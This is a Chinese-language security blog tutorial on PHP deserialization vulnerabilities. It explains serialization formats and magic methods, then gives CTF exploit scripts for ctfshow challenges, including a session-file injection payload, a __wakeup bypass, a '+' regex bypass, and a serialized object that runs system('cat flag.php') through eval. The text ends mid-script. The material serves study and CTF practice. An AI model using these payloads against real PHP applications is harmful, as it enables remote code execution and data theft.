class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/"><header><a class="post-meta-categories" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" itemprop="url">常见top漏洞</a><h1 id="CrawlerTitle" itemprop="name headline">浅析反序列化</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2023-07-27T08:46:43.037Z" title="发表于 2023-07-27 16:46:43">2023-07-27</time><time itemprop="dateCreated datePublished" datetime="2024-04-15T11:49:21.305Z" title="更新于 2024-04-15 19:49:21">2024-04-15</time></header><h1 id="php反序列化">PHP反序列化</h1>
<h2 id="0x01-简介">0x01 简介</h2>
<p>什么是序列化？<br>
<strong>对象转换成字符串</strong><br>
为什么转换：1.持久保存。2.方便网络传输，例如session缓存，cookie等</p>
<p>什么是反序列化？<br>
<strong>字符串转换成对象</strong></p>
<p>php序列化和反序列化的函数：</p>
<p>序列化：serialize()</p>
<p>反序列化：unserialize()</p>
<p>tip：对字符串进行序列化后是它本身**（ctfshow web260）**</p>
<p>源码：</p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">include</span>(<span class="hljs-string">'flag.php'</span>);

<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/ctfshow_i_love_36D/'</span>,<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'ctfshow'</span>]))){
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
}
<span class="hljs-comment">//因此直接?ctfshow=/ctfshow_i_love_36D/   即可</span></code></pre>
<h2 id="0x02-为何要-php-的序列化和反序列化">0X02 为何要 PHP 的序列化和反序列化</h2>
<p>看到这里，肯定会有人问这个问题，如果说 json 是为了传递数据的方便性，那么 PHP 的序列化又是为了什么呢？</p>
<p>当然，传递数据的方便肯定是这种压缩并格式化存储的一大共同的属性，那么序列化除了这种属性以外还有什么特性呢？要是只是这样那干脆不如直接用 json 好了，当然有，从上面的实验中你没发现吗？我们把一个实例化的对象长久地存储在了计算机的磁盘上，无论什么时候调用都能恢复原来的样子，这其实是为了解决 PHP 对象传递的一个问题,因为 PHP 文件在执行结束以后就会将对象销毁，那么如果下次有一个页面恰好要用到刚刚销毁的对象就会束手无策，总不能你永远不让它销毁，等着你吧，于是人们就想出了一种能长久保存对象的方法，这就是 PHP 的序列化，那当我们下次要用的时候只要反序列化一下就 ok 啦，是不是很方便？</p>
<h2 id="0x03-常见的序列化格式">0x03 常见的序列化格式</h2>
<ul>
<li>二进制格式</li>
<li>字节数组</li>
<li>json字符串</li>
<li>xml字符串</li>
</ul>
<h2 id="0x04-案例">0x04 案例</h2>
<p>数组序列化</p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
  <span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">'hello'</span>,<span class="hljs-string">'hi'</span>);
  <span class="hljs-variable">$a_ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);
  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a_ser</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>结果：</p>
<pre><code class="hljs plaintext">a:2:{i:0;s:5:"hello";i:1;s:2:"hi";}</code></pre>
<pre><code class="hljs plaintext">2：表示a有两个属性
i：表示int型数据；0：表示下标0
s：表示string字符串数组；5：长度为5</code></pre>
<p>解析：</p>
<pre><code class="hljs plaintext">a - array      b - boolean
d - double     i - integer
o - common     object r - reference
s - string     C - custom object
O - class      N - null
R - pointer    reference U - unicode string</code></pre>
<p>对象序列化</p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span></span>{
        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;
        <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">'abab'</span>;
            <span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-number">18</span>;
        }
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pr</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;name;
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;age;
        }
        }
    <span class="hljs-variable">$stu</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();
    <span class="hljs-variable">$stu_ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$stu</span>);
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$stu_ser</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>结果：</p>
<pre><code class="hljs plaintext">O:7:"Student":2:{s:4:"name";s:4:"abab";s:3:"age";i:18;}</code></pre>
<p><strong>注：序列化后的内容只有成员变量，没有成员函数</strong></p>
<p>还有一种成员变量就是protected类型</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>{
        <span class="hljs-keyword">public</span> <span class="hljs-variable">$aa</span>;
        <span class="hljs-keyword">private</span> <span class="hljs-variable">$bb</span>;
        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$cc</span>;
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-variable language_">$this</span>-&gt;aa = <span class="hljs-string">'aaa'</span>;
            <span class="hljs-variable language_">$this</span>-&gt;bb = <span class="hljs-string">'bbb'</span>;
            <span class="hljs-variable language_">$this</span>-&gt;cc = <span class="hljs-string">'ccc'</span>;
        }
    }
    <span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();
    <span class="hljs-variable">$d_ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$d</span>);
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$d_ser</span>;

<span class="hljs-meta">?&gt;</span></code></pre>
<p>如果是private类型，会在变量名前加上**\x00类名\x00**，如果是protected类型，则会加上**\x00*\x00**，<br>
这些都是不可见字符</p>
<p>输出则会导致不可见字符<code>\x00</code>的丢失</p>
<p>结果：</p>
<pre><code class="hljs plaintext">O:4:"test":3:{s:2:"aa";s:3:"aaa";s:8:"testbb";s:3:"bbb";s:5:"*cc";s:3:"ccc";}</code></pre>
<p><strong>如果需要本地存储推荐“urlencode”</strong></p>
<pre><code class="hljs plaintext">urlencode($d_ser);</code></pre>
<p><strong>序列化函数serialize()</strong></p>
<p>首先我创一个Ctf类 里面写了三个属性 后创建了一个ctfer对象 将Ctf类里的信息进行了改变。<strong>如果后面还要用到这个对象，就可以先将这个对象进行实例化。用的时候在反序列化出来就ok了。</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623204959799.png" alt="image-20230623204959799"></p>
<p>serialize() 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，<strong><code>__sleep()</code>方法会先被调用，然后才执行序列化操作</strong>。</p>
<p><strong>可以在<code>__sleep()</code>方法里决定哪些属性可以被序列化。如果没有__sleep()方法则默认序列化所有属性</strong></p>
<p>实例：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623205119665.png" alt="image-20230623205119665"></p>
<p><code>即__sleep()</code>方法使 flag age 属性序列化，而name并没有被序列化。所以<strong>可以在<code>__sleep()</code>方法里决定哪些属性被序列化。</strong></p>
<h2 id="0x05-访问控制修饰符">0x05 访问控制修饰符</h2>
<p>根据<strong>访问控制修饰符的不同</strong> 序列化后的 <strong>属性长度</strong>和<strong>属性值</strong>会有所不同，所以这里简单提一下</p>
<pre><code class="hljs plaintext">public(公有) 
protected(受保护)     // %00*%00属性名
private(私有的)       // %00类名%00属性名</code></pre>
<p>protected属性被序列化的时候<strong>属性值</strong>会变成**%00*%00属性名**<br>
private属性被序列化的时候<strong>属性值</strong>会变成**%00类名%00属性名**</p>
<p><strong>（%00为空白符，空字符也有长度，一个空字符长度为 1）</strong></p>
<p>实例：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ctf</span></span>{ 
	<span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">'Sch0lar'</span>; 
	<span class="hljs-keyword">protected</span> <span class="hljs-variable">$age</span>=<span class="hljs-string">'19'</span>; 
	<span class="hljs-keyword">private</span> <span class="hljs-variable">$flag</span>=<span class="hljs-string">'get flag'</span>;
    } 
<span class="hljs-variable">$ctfer</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctf</span>(); <span class="hljs-comment">//实例化一个对象</span>
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$ctfer</span>); 
<span class="hljs-meta">?&gt;</span> 
<span class="hljs-comment">//输出结果 </span>
O:<span class="hljs-number">3</span>:<span class="hljs-string">"Ctf"</span>:<span class="hljs-number">3</span>:{s:<span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">"Sch0lar"</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"*age"</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">"19"</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">"Ctfflag"</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">"get flag"</span>;}</code></pre>
<p>可以看到</p>
<pre><code class="hljs plaintext">s:6:"*age"   //*前后出现两个空白符，一个空白符长度为1，所以序列化后，该属性长度为6
s:9:"Ctfflag"   //类名Ctf前后出现两个%00空白符，所以长度为9</code></pre>
<h2 id="0x06-php-反序列化">0x06 PHP-反序列化</h2>
<h3 id="61-常见的php魔术方法">6.1 常见的PHP魔术方法</h3>
<pre><code class="hljs plaintext">__construct()，类的构造函数，当一个对象创建时被调用，反序列化不触发

__destruct()，类的析构函数，但如果程序报错或者抛出异常，就不会触发该魔术方法

__call()，在对象中调用一个不可访问方法时调用

__callStatic()，在静态上下文中调用一个不可访问的方法时调用

__get()，读取不可访问属性的值时调用

__set()，在给不可访问属性赋值时调用

__isset()，当对不可访问属性调用isset()和empty()时，__isset()被调用

__unset()，当对不可访问属性调用unset()时，__unset()会被调用

__sleep()，执行serialize()时，先会调用这个函数

__wakeup()，执行unserialize()时，先会调用这个函数

__toString()，类被当成字符串时的回应方法

__invoke()，当尝试以调用函数的方式调用一个对象时，__invoke()方法会被自动调用

__set_state()，当调用var_export()导出类时，此静态方法会被调用

__clone()，当对象复制完成时调用

__debuginfo()，当转储对象以获取应显示的属性时，会被调用

__autoload()，尝试加载未定义的类

__serialize()，执行serialize()时，先会调用这个函数(这个和__sleep()的区别后面会详细介绍)

__unserialize()，执行unserialize()时，先会调用这个函数(这个和__wakeup()的区别后面会详细介绍)</code></pre>
<p><strong>反序列化函数unserialize()。反序列化就是将一个序列化了的对象或数组字符串，还原回去</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623205817354.png" alt="image-20230623205817354"></p>
<p><strong>与序列化函数类似，unserialize()会检查类中是否存在一个<code>__wakeup</code>魔术方法</strong><br>
<strong>如果存在则会先调用<code>__wakeup()</code>方法，再进行序列化</strong></p>
<p><strong>可以在<code>__wakeup()</code>方法中对属性进行初始化、赋值或者改变。</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623205935983.png" alt="image-20230623205935983"></p>
<p>反序列化之前重新给flag<strong>属性赋值</strong></p>
<pre><code class="hljs plaintext">// 输出结果 
object(Ctf)#2 (3) {
	["flag"]=&gt;
    string(13) "no flag"
    ["name"]=&gt;
    string(7) "Sch0lar"
    ["age"]=&gt;
    string(2) "18"
}</code></pre>
<h3 id="62-漏洞成因">6.2 漏洞成因</h3>
<p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。</p>
<p>在反序列化的过程中自动触发了某些魔术方法。</p>
<p><strong>漏洞触发条件：</strong> unserialize函数的参数、变量可控，php文件中存在可利用的类，类中有魔术方法</p>
<p>而在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。这样，一旦我们能够控制unserialize()入口，那么就可能引发对象注入漏洞。</p>
<h3 id="63-序列化引擎">6.3 序列化引擎</h3>
<p>php对session的处理有三种引擎分别为php、php_serialize、php_binary.经过这三者处理后的session结构都不相同。</p>
<pre><code class="hljs plaintext">php_serialize	-&gt;与serialize函数序列化后的结果一致
php				-&gt;key|serialize后的结果
php_binary		-&gt;键名的长度对应的ascii字符+键名+serialize()函数序列化的值

默认使用php引擎</code></pre>
<p>使用php引擎的结果：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623210757827.png" alt="image-20230623210757827"></p>
<p>使用php_serialize引擎的结果：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623210822480.png" alt="image-20230623210822480"></p>
<p>使用php_binary引擎的结果如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623210839958.png" alt="image-20230623210839958"></p>
<p>其中存在不可见字符，将结果进行URL编码如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623210956081.png" alt="image-20230623210956081"></p>
<p>在session文件可写的情况下，可手动写入我们想要的内容,例如</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'/var/www/html'</span>);
<span class="hljs-title function_ invoke__">session_save_path</span>(<span class="hljs-string">'/var/www/html'</span>);
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">include</span> <span class="hljs-string">"flag.php"</span>;

<span class="hljs-variable">$banner</span> = <span class="hljs-string">"--4ut15m--\n"</span>;

<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'name'</span>]===<span class="hljs-string">'admin'</span>){
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>.<span class="hljs-string">"&lt;br&gt;"</span>;
}<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'content'</span>])){
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/ph/i'</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>])){
                <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>]);
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'over'</span>);
        }<span class="hljs-keyword">else</span> <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">'/var/www/html/'</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>],<span class="hljs-variable">$banner</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'content'</span>]);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>该题目中可任意文件写入，故写入session文件构造name=admin.<code>payload=|s:3:"xxx";name|s:5:"admin";</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623211359257.png" alt="image-20230623211359257"></p>
<p>简单说一下payload.</p>
<p>banner和payload拼接在一起后变为<code>--4ut15m--\n|s:3:"xxx";name|s:5:"admin";</code>经php序列化引擎反序列化后就成为了</p>
<pre><code class="hljs plaintext">$_SESSION=['--4ut15m--\n' =&gt; 'xxx', 'name' =&gt; 'admin']</code></pre>
<h2 id="0x07-反序列化绕过小trick">0x07 反序列化绕过小Trick</h2>
<h3 id="71-php71反序列化对类属性不敏感">7.1 php7.1+反序列化对类属性不敏感</h3>
<p>我们前面说了如果变量前是protected，序列化结果会在变量名前加上<code>\x00*\x00</code></p>
<p>但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有<code>\x00*\x00</code>也依然会输出<code>abc</code></p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>{
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$a</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">'abc'</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a;
    }
}
<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">'O:4:"test":1:{s:1:"a";s:3:"abc";}'</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<h3 id="72-绕过__wakeup">7.2 绕过__wakeup</h3>
<pre><code class="hljs plaintext">版本：
​ PHP5 &lt; 5.6.25
​ PHP7 &lt; 7.0.10</code></pre>
<p>利用方式：<strong>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong></p>
<p>例：</p>
<pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">'abc'</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">'666'</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a;
    }
}</code></pre>
<pre><code class="hljs plaintext">如果执行unserialize('O:4:"test":1:{s:1:"a";s:3:"abc";}');输出结果为666

而把对象属性个数的值增大执行unserialize('O:4:"test":2:{s:1:"a";s:3:"abc";}');输出结果为abc</code></pre>
<h3 id="73-绕过部分正则">7.3 绕过部分正则</h3>
<p>正则表达式：描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹<br>
配的子串替换或者从某个串中取出符合某个条件的子串等。</p>
<pre><code class="hljs plaintext">preg_match('/^O:\d+/')
//匹配序列化字符串是否是对象字符串开头，+号可以实现绕过（+号代表空格）
//另外反序列化在遇到+号时也会自动退出反序列化进程</code></pre>
<p>利用加号绕过（在url传参时注意+编码为%2B）</p>
<p><strong>serialize(array( a ) )</strong> a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">'abc'</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a.PHP_EOL;
    }
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">match</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>{
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/^O:\d+/'</span>,<span class="hljs-variable">$data</span>)){
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'you lose!'</span>);
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;
    }
}
<span class="hljs-variable">$a</span> = <span class="hljs-string">'O:4:"test":1:{s:1:"a";s:3:"abc";}'</span>;
<span class="hljs-comment">// +号绕过</span>
<span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'O:4'</span>,<span class="hljs-string">'O:+4'</span>, <span class="hljs-variable">$a</span>);
<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-keyword">match</span>(<span class="hljs-variable">$b</span>));
<span class="hljs-comment">// serialize(array($a));</span>
<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">'a:1:{i:0;O:4:"test":1:{s:1:"a";s:3:"abc";}}'</span>);</code></pre>
<p>对应 <strong>ctfshow web258</strong></p>
<p>编写脚本：</p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">'xxxxxx'</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">'xxxxxx'</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">'backDoor'</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span>
<span class="hljs-class">    }</span>
<span class="hljs-class"></span>
<span class="hljs-class">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__destruct</span>()</span>{
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span>
<span class="hljs-class">    }</span>
<span class="hljs-class"></span>
<span class="hljs-class">}</span>
<span class="hljs-class"></span>
<span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">backDoor</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">'system("cat flag.php");'</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);
    }
}
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();
<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'O:'</span>, <span class="hljs-string">'O:+'</span>,<span class="hljs-variable">$a</span>);<span class="hljs-comment">//绕过preg_match</span>
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-meta">?&gt;</span>
    <span class="hljs-comment">//主要是调用backDoor执行eval命令函数获取flag</span></code></pre>
<h3 id="74-利用引用">7.4 利用引用</h3>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">'abc'</span>;
        <span class="hljs-variable language_">$this</span>-&gt;b= &amp;<span class="hljs-variable language_">$this</span>-&gt;a;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{

        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;a===<span class="hljs-variable language_">$this</span>-&gt;b){
            <span class="hljs-keyword">echo</span> <span class="hljs-number">666</span>;
        }
    }
}
<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>());</code></pre>
<p>上面这个例子将<code>$b</code>设置为<code>$a</code>的引用，可以使<code>$a</code>永远与<code>$b</code>相等</p>
<p>对应于<strong>ctfshow 265</strong></p>
<p>脚本代码：</p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowAdmin</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$t</span>,<span class="hljs-variable">$p</span></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;token=<span class="hljs-variable">$t</span>;
        <span class="hljs-variable language_">$this</span>-&gt;password = &amp;<span class="hljs-variable language_">$this</span>-&gt;token;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;token===<span class="hljs-variable language_">$this</span>-&gt;password;
    }
}

<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshowAdmin</span>(<span class="hljs-string">'123'</span>,<span class="hljs-string">'123'</span>));
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$a</span>);
